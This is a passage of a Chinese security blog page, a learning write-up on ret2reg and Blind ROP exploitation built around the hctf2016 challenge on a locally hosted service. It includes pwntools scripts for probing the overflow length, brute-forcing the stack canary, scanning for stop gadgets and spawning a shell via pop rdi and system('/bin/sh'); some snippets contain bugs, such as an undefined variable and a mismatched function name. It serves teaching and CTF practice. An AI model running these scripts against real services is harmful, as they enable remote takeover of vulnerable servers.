@@ -1,0 +1,1543 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="二进制安全,pwn,栈溢出," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="终于开学啦！前几天没有课刚好可以记录下知识">
+<meta name="keywords" content="二进制安全,pwn,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="再探ROP(下)">
+<meta property="og:url" content="http://1234xxh.github.io/2020/09/07/1/index.html">
+<meta property="og:site_name" content="sh0wmak3r&#39;s Blog">
+<meta property="og:description" content="终于开学啦！前几天没有课刚好可以记录下知识">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/12.jpg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image2.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image3.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image4.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image5.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image6.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image7.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image8.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image9.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image10.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200907/image11.png">
+<meta property="og:updated_time" content="2020-09-08T07:52:22.557Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="再探ROP(下)">
+<meta name="twitter:description" content="终于开学啦！前几天没有课刚好可以记录下知识">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/12.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1234xxh.github.io/2020/09/07/1/"/>
+
+
+
+
+
+  <title>再探ROP(下) | sh0wmak3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <!-- <div class="headband"></div> -->
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sh0wmak3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">safe | smart contract | binary</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2020/09/07/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bey0ndm3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sh0wmak3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">再探ROP(下)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-09-07T20:32:56+08:00">
+                2020-09-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2020/09/07/1/" class="leancloud_visitors" data-flag-title="再探ROP(下)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>终于开学啦！前几天没有课刚好可以记录下知识</p>
+<p><img src="/image/N2LL/12.jpg" alt="image"><br><a id="more"></a></p>
+<h1 id="0x00-前记"><a href="#0x00-前记" class="headerlink" title="0x00 前记"></a>0x00 前记</h1><blockquote>
+<p>先说一下这篇文章的脉络结构：<br><strong>一、ret2reg 的学习和理解</strong><br><strong>二、brop 的学习和探讨</strong><br>ret2reg的知识就是就是对前面知识的变换，很简单，所以不做深入，其实就是ret2addr的演变。在概述里面会简单说一下brop部分，这个有趣的内容。</p>
+</blockquote>
+<blockquote>
+<p>以上是一个分割线，这里步入正题。<br><strong>brop，早在2014年，发表在Oakland的一篇文叫Hacking Blind，作者是来自Standford的Andrea Bittau，</strong> 这是一位巨佬级人物，看完他的论文后真的很佩服，在当时就把这个技术讲述的淋漓尽致（论文什么的后续会细说，这里就是抛砖引玉）。<br>那为什么要写这篇文章呢？<br>一、记录自己的学习历程，算是一个备忘录，俗话说：好记性不如烂笔头。<br><strong>二、在学习中（这里强调一下，作为小白的我，从一片空白到刚刚接触）踩过坑，怎么一步一步小白式的理解，或者大言不惭一下：通熟易懂，把涉及的知识面、知识点都覆盖到。</strong><br>好了，开始今天的表演，show time～</p>
+</blockquote>
+<h1 id="0x01-ret2reg"><a href="#0x01-ret2reg" class="headerlink" title="0x01 ret2reg"></a>0x01 ret2reg</h1><h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><blockquote>
+<p>安全人员为保护免受ret2addr攻击，想到了一个办法，那就是地址混淆技术。该述语英文称为 Address Space Layout  Randomize，直译为地址随机化。该技术将栈，堆和动态库空间全部随机化。在32位系统上，随机量在64M范围；而在64位系统，它的随机量在2G范围，因此原来的ret2addr技术无法攻击成功。<br>ret2addr其实就是我们<a href="http://bey0nd.xyz/2020/03/15/1/" target="_blank" rel="noopener">初探ROP</a>说到的方法，具体请见这篇文章。<br>不过虽有有了保护，攻与守总会在相辅相成，互相促进，互相进步，因此很快攻击者想到另一种攻击方法ret2reg，即return-to-register，返回到寄存地址执行的攻击方法。</p>
+</blockquote>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote>
+<p>1） 存在栈溢出漏洞，满足ret2shellcode利用条件，开启了aslr，没有开启pie<br>2）能拿到原文件，并且找到了与我们可控的栈空间有关联的寄存器reg1<br>3）栈溢出覆盖ret addr位置为call *reg1指令的地址，此时栈中写入了shellcode，找到的reg1存储的地址为shellcode的起始地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">普及一下aslr和pie的区别：</span><br><span class="line">aslr，直译为地址随机化。该技术将栈，堆和动态库空间全部随机化。</span><br><span class="line">pie，linux gcc编译器随后提供了fpie选项，此编译后修补aslr的漏洞，除了将栈，堆和动态库空间全部随机化，还把整个程序地址混淆了。</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>只要理解了ret2shellcode，只需要找到一个可控存储内容的寄存器，再有一条call *reg的指令即可完成此攻击。说到底，寄存器仅仅是一个中间介质。由于简单，仅仅是ret2shellcode的升级，就不再展开细说了，开始让我激动的第三部分</p>
+</blockquote>
+<h1 id="0x02-brop"><a href="#0x02-brop" class="headerlink" title="0x02 brop"></a>0x02 brop</h1><blockquote>
+<p><strong>第一部分很简单，有了上篇文章对ret2csu的铺垫，继续。</strong><br>在探讨brop之前我们得先了解一下概念和几点基本知识，能够帮助我们继续往下探讨：</p>
+</blockquote>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p>开头已经引入了一些内容，这里补充一下<br>BROP攻击，全称Blind Return Oriented Programming Attack，是基于一篇发表在Oakland 2014的论文Hacking Blind，作者是来自Standford的Andrea Bittau。<br>引用原文一句话：<br><strong>通过BROP攻击，无需拥有目标二进制文件就可以编写漏洞利用程序。它需要堆栈溢出，并且服务必须在崩溃后重新启动。根据服务是否崩溃（即，连接关闭还是保持打开状态），BROP攻击能够构建导致Shell的完整远程利用。BROP攻击会远程泄漏足够的小工具来执行写系统调用，然后将二进制文件从内存转移到攻击者的套接字。之后，可以执行标准的ROP攻击。除了攻击专有服务外，BROP在针对不公开使用特定二进制文件（例如从源代码安装程序，Gentoo盒等安装）的开源软件时非常有用。<br>当针对专有服务进行测试时，该攻击完成了4,000个请求（在几分钟内），并且在nginx和MySQL中存在实际漏洞。<br>有时在服务器中看到的根本问题是，它们在崩溃后派生了一个新的工作进程，而没有任何重新随机化（例如，没有execve跟随派生）。例如，nginx就是这样做的。</strong><br>原文地址：<a href="http://www.scs.stanford.edu/brop/" target="_blank" rel="noopener">点击直达</a></p>
+</blockquote>
+<blockquote>
+<p>仔细阅读上述文字和文章，大体的概念和用处已经一目了然了。<br>这里再给出相关的paper和slide<br>paper - <a href="http://www.scs.stanford.edu/brop/bittau-brop.pdf" target="_blank" rel="noopener">点击直达</a><br>slide  - <a href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf" target="_blank" rel="noopener">点击直达</a></p>
+</blockquote>
+<blockquote>
+<p>根据以上文章大家可以学到作者Andrea Bittau的绝妙思路和操作，仔细研读后就能领悟到其中的精华（看了翻译的的论文，晕晕的，太难了，来自小白对大佬的仰望，不说这些，还是来点实际的，老老实实的学习）<br><strong>继续探讨前要明白两个概念：<br>stop gadget：一般情况下，栈上的return address随意覆盖的内存地址的话，程序有很大可能性会挂掉，比如，该return address指向了一段代码区域，里面会有一些对空指针的访问造成程序crash，又比如p64(0)。那么与之相反（程序不会crash）就是stop gadget。<br>useful gadget：我们能够作为payload的gadget，比如我们后面会说到的pop rdi; ret。</strong><br>有了这些知识后，我们继续往下走。</p>
+</blockquote>
+<h2 id="逆向思维切入"><a href="#逆向思维切入" class="headerlink" title="逆向思维切入"></a>逆向思维切入</h2><blockquote>
+<p>看过好多相关的文章，大佬们写得太棒啦（深深的膜拜中），由于涉及的内容过多，对于我这个初学者来说，学习第一遍，云里雾里，摸不清头脑（究其原因，还是自己太菜了）。<br>于是为了帮助这么菜的我更好的学习，自己清晰地梳理一下我是怎么样从无到有的学习步骤：</p>
+</blockquote>
+<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><blockquote>
+<p>从hctf2016 ——“出题人失踪了”这道题目开始说起，本地搭建环境，编译一个开启了canary的保护机制的文件<br>gcc -z noexecstack -fno-stack-protector  -no-pie -o brop brop.c<br>使用Socat建立通道进行访问，可以发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn@MacBook-Pro ~ %  nc 10.112.26.131 1000</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">123</span><br><span class="line">No password, no game</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>在没有elf文件的情况下进行，显然就是brop手法运用的场景。<br>nc后，程序会有一个输入等待地方，依照之前的知识，可以知道这里很有可能就存在栈溢出漏洞,继续输入过长的字符，只需要溢出时抛出异常即可。</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwn@MacBook-Pro ~ % nc 10.112.26.131 1000</span><br><span class="line">WelCome my friend,Do you know password?</span><br><span class="line">11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br><span class="line">pwn@MacBook-Pro ~ %</span><br></pre></td></tr></table></figure>
+<h3 id="溢出长度和爆破canary"><a href="#溢出长度和爆破canary" class="headerlink" title="溢出长度和爆破canary"></a>溢出长度和爆破canary</h3><blockquote>
+<p>既然要栈溢出，根据前面的经验，需要知道溢出临界点，也即是填充的长度是多少，很简单，给出代码：</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">def getLength():</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">        sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">        sh.send(i * &apos;a&apos;)</span><br><span class="line">        try:</span><br><span class="line">            byte = sh.recv()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(&quot;[+] sucessfully! length is &quot; + str(i-1) + &quot;\n&quot;)</span><br><span class="line">            sh.close()</span><br><span class="line">            exit()</span><br><span class="line">        length = byte.decode()</span><br><span class="line">        sh.close()</span><br><span class="line">        if length.startswith(&apos;No password&apos;):</span><br><span class="line">            print(&quot;[*] length greater than &quot; + str(i) + &quot;\n&quot;)</span><br><span class="line">        else:</span><br><span class="line">            exit()    </span><br><span class="line">        i = i + 1</span><br><span class="line">    sh.close()</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    getlength()</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[x] Opening connection to 10.112.26.131 on port 1000</span><br><span class="line">[x] Opening connection to 10.112.26.131 on port 1000: Trying 10.112.26.131</span><br><span class="line">[+] Opening connection to 10.112.26.131 on port 1000: Done</span><br><span class="line">[+] sucessfully! length is 72</span><br><span class="line">[*] Closed connection to 10.112.26.131 port 1000</span><br><span class="line">[Finished in 1.6s]</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>可以发现length是72，由于原题没有开启canary保护机制，所以就省略了一步操作，我们重在于学习，因此开启canary保护机制重新利用，这里有几点需要注意：<br>BROP对存在栈溢出的ELF进行指令盲注，需要几个前提：一、进程crash后可以重启，这个当前例子即可满足；二、进程通过fork重启，从而保持多次重启程序时的状态不变，比如canary不变。<br>给出爆破cannay代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def getCanary():</span><br><span class="line">    sh = remote(&apos;10.112.26.131&apos;, 10001)</span><br><span class="line">    canary = &apos;\x00&apos;</span><br><span class="line">    payload_base = 72 * &apos;a&apos;</span><br><span class="line">    for i in range(7):</span><br><span class="line">        payload_base = payload_base + canary</span><br><span class="line">        for j in range(256):</span><br><span class="line">            sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">            payload = payload_base</span><br><span class="line">            payload += chr(j)</span><br><span class="line">            sh.send(payload)</span><br><span class="line">            byte = sh.recv()</span><br><span class="line">            if &apos;Welcome&apos; in byte:</span><br><span class="line">           		canary = chr(j)</span><br><span class="line">           		break</span><br><span class="line"> 	print(payload_base)</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>参考：<a href="https://xz.aliyun.com/t/4657" target="_blank" rel="noopener">canary各种姿势绕过</a>的bin1，<br>以上只是其中的一个插曲，继续探讨正题。</p>
+</blockquote>
+<h3 id="如何getshell"><a href="#如何getshell" class="headerlink" title="如何getshell"></a>如何getshell</h3><blockquote>
+<p>有了长度，也可以知道是存在栈溢出漏洞，岂不是按照之前的方法getshell就完成了吗？接下来一顿操作猛如虎。</p>
+</blockquote>
+<blockquote>
+<p>现在我们知道溢出临界点位置，下面就是如何构造payload进行getshell。<br>这里思路其实很简单，都是利用栈溢出来进行getshell，特殊的只是需要brop的方法。<br>根据现有知识（从第一篇文章读到这，脑海里仅仅只有一般的栈溢出利用）我们对于此题或者说怎么样去运用此方法。<br>其实就是实现如下操作即可，如下图：</p>
+</blockquote>
+<p><img src="/image/20200907/image1.png" alt="image"></p>
+<blockquote>
+<p>相应的，给出代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def getShell(pop_rdi_addr, binsh_addr, system_adddr):</span><br><span class="line">    payload =  &apos;a&apos; * 72  + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_adddr)</span><br><span class="line">    sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">    sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">    sh.send(i * &apos;a&apos;)</span><br><span class="line">    sh.interactive()</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<blockquote>
+<p>是不是与之前的知识有了对应？但是呢，问题也随之来了，在没有elf文件的时候，pop_rdi_addr, binsh_addr, system_adddr这三个参数如何得来呢？<br>下面就是解决此三个三个参数了。</p>
+</blockquote>
+<h3 id="寻找直接条件"><a href="#寻找直接条件" class="headerlink" title="寻找直接条件"></a>寻找直接条件</h3><p>寻找 pop_rdi_addr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi；</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>这一个是不是很眼熟呢？在第一部分的ret2csu中有一个地方是可以得到此gadgets，继续往下看：</p>
+</blockquote>
+<p><img src="/image/20200907/image2.png" alt="image"></p>
+<blockquote>
+<p>注意这里，当然没有pop rdi的身影，这里我们要知道汇编语言指令是机器指令的一种符号表示，也就是说两者是一一对应的，比如0x90就是nop指令。这里插入一个小插曲，如下图所示：</p>
+</blockquote>
+<p><img src="/image/20200907/image3.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /1x 0x4007a0</span><br><span class="line">0x4007a0 &lt;__libc_csu_init+96&gt;:	0x5f415e41</span><br><span class="line">gdb-peda$ x /1x 0x4007a1</span><br><span class="line">0x4007a1 &lt;__libc_csu_init+97&gt;:	0xc35f415e</span><br><span class="line">gdb-peda$ x /1x 0x4007a2</span><br><span class="line">0x4007a2 &lt;__libc_csu_init+98&gt;:	0x90c35f41</span><br><span class="line">gdb-peda$ x /1x 0x4007a4</span><br><span class="line">0x4007a4 &lt;__libc_csu_init+100&gt;:	0x2e6690c3</span><br><span class="line">gdb-peda$ x /1x 0x4007a5</span><br><span class="line">0x4007a5:	0x0f2e6690</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>上述gdb处需要知道有一个小常识，小端存储，然后再与上图相对照。<br>小插曲结束，我们回到正题，为什么要有这一个小插曲呢？根据偏移值的不同，导致编译时候对齐位置不同，可以让机器编码变成不同指令了，依然是以上图为例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x /1i 0x4007a1</span><br><span class="line">   0x4007a1 &lt;__libc_csu_init+97&gt;:	pop    rsi</span><br><span class="line">gdb-peda$ x /1i 0x4007a3</span><br><span class="line">   0x4007a3 &lt;__libc_csu_init+99&gt;:	pop    rdi</span><br><span class="line">gdb-peda$ x /1i 0x4007a4</span><br><span class="line">   0x4007a4 &lt;__libc_csu_init+100&gt;:	ret</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p><img src="/image/20200907/image4.png" alt="image"></p>
+<blockquote>
+<p>偏移量不同，对齐后就会形成我们想要的指令，当然我们也可以使用ida，修改一下byte，进行对比看一下：</p>
+</blockquote>
+<p><img src="/image/20200907/image5.png" alt="image"></p>
+<blockquote>
+<p>说么这么多废话就是为了找到这一个gadgets，接下来就是寻找binsh_addr, system_adddr，这个现在细说不合适，大体说一下，后面会水到渠成的理解。我们在得到put@got表的内容后，通过偏移计算出 system() 函数和字符串 /bin/sh 的地址，这里其实就是前面的方法的知识。</p>
+</blockquote>
+<h3 id="寻找间接条件"><a href="#寻找间接条件" class="headerlink" title="寻找间接条件"></a>寻找间接条件</h3><blockquote>
+<p>说到这，我们只能确定直接getshell的条件，先捋一下，清晰条理：<br><strong>一、通过通用gadgets（__libc_csu_init）寻找到pop_rdi_addr<br>二、得到put@got表的内容后，寻找到binsh_addr和 system_adddr</strong><br>那么相应的问题就来了<br><strong>一、如何能找到通用gadgets（__libc_csu_init）呢？并且顺利找到pop_rdi_addr<br>二、如何获取put@got表的内容</strong><br>因为偏移的计算在前面的方法中已经使用过，可以去回顾一下。</p>
+</blockquote>
+<p>先来解决第一个问题：如何能找到通用gadgets（__libc_csu_init）呢？并且顺利找到pop_rdi_addr。</p>
+<blockquote>
+<p>因为拿不到源程序，所以解决第一个问题的方法是构造相应的payload去猜测出是否某一段代码是，并且去验证，最后拿到此gadgets的地址。<br>文章这部分开头已经提到了stop gadget，相反也有no stop gadget，两者配合即可找到通用gadgets（__libc_csu_init），进而获取我们的useful gadget，或者说我们brop gadget，用一张图形象的表述出来如何构造：</p>
+</blockquote>
+<p><img src="/image/20200907/image6.png" alt="image"></p>
+<blockquote>
+<p>一般来说，都是64位程序，可以直接从0x400000尝试，如果不成功，有可能程序开启了PIE保护或者是32位程序，显然此题是no pie的64bit文件。<strong>从0x400000开始直到初步找到有使程序不crash的地方，这个地方有可能就是是六个pop操作（大于或者小于6个，rip就会指向p64(0)（当然你填写p64(1)，p64(2)等都可以），导致程序crash）和一个retq操作。</strong> 然后需要一步检查，如果经过一个useful gadget把上图中的addr，恰巧addr是stop gadget返回给rip中，这个useful gadget虽然符合条件，但是显然不是我们要找的brop gadget，因此需要一步检查。</p>
+</blockquote>
+<p><img src="/image/20200907/image7.png" alt="image"></p>
+<blockquote>
+<p>此时对useful gadget进行检查，若crash，则基本上brop gadget。为了后续的代码能够有效运行，我们得先找到stop gadget，得先补一个代码，就是找到一个stop gadget，因为这是寻找其他片段的前提，在寻找的过程中可以发现stop gadgets有不少，这里挑选出来main函数的入口地址（个人强迫症，而且也没有用途，画蛇添足），给出代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">def getMain(base_addr):</span><br><span class="line">    addr = base_addr</span><br><span class="line">    while True:</span><br><span class="line">        payload = p64(0) * 9 + p64(addr)</span><br><span class="line">        sh = remote(&apos;10.112.26.131&apos;, 1000)</span><br><span class="line">        sh.recvuntil(&apos;WelCome my friend,Do you know password?\n&apos;)</span><br><span class="line">        sh.send(payload)</span><br><span class="line">        try:</span><br><span class="line">            byte = sh.recv()</span><br><span class="line">        except Exception as e:</span><br><span class="line">            sh.close()</span><br><span class="line">            print(&quot;[+] bad address: 0x%x&quot; % addr)</span><br><span class="line">            addr += 1</span><br><span class="line">            continue</span><br><span class="line">        c = byte.decode()</span><br><span class="line">        print(&quot;[*] stop gadget address: 0x%x&quot; % addr)</span><br><span class="line">        if c.startswith(&apos;WelCome my friend&apos;):</span><br><span class="line">            print(&quot;[*] main address: 0x%x&quot; % addr)</span><br><span class="line">            return addr</span><br><span class="line">        addr += 1</span><br><span class="line">        sh.close()</span><br></pre></td></tr></table></figure></p>
+</blockquote>
